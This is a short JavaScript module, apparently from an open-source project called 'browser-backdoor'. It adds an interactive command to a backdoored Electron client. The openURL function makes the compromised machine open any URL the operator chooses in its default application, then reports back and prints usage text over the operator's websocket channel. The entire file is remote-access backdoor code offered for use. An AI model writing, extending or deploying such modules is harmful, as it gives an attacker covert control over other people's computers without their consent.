// INTERACTIVE
/**
 * @file openURL Module
 * @summary Opens a URL with the default application on the client system.
 * @author IMcPwn 
 * @see https://github.com/IMcPwn/browser-backdoor
 * @license MIT
 * @version 0.1
 */

electron = require('electron');

/**
 * @param {String} url - The URL to open.
 * @return {String} "Opened $url"
 */
openURL = function (url) {
    electron.shell.openExternal(url);
    ws.send("Opened " + url);
}

ws.send("\nUsage: openURL(url)\n- url is the URL to open with the default application.");
